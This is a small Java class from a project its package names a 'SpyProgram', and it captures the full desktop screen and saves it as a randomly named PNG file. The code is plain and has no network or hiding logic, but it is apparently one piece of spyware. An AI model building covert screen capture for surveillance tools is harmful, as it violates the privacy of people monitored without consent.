package com.KostiantynBoiar.SpyProgram.SpyCode.ScreenshotRec;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

import java.util.Random;

public class PrntScreen {
    /*
    *
    * Method should do screenshot of desktop
    */

    public String photo() throws IOException, AWTException {
        String path = new File("").getAbsolutePath();
        String format = ".png";

        // Generating random number so that the names do not repeat
        Random ran = new Random();
        int number = ran.nextInt(100000000);
        String nameOfScreenshot = Integer.toString(number);

         String fullName = path + nameOfScreenshot + format;
        //System.out.println(fullName);

        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        ImageIO.write(image, "png", new File(fullName));
        return fullName;
    }
}
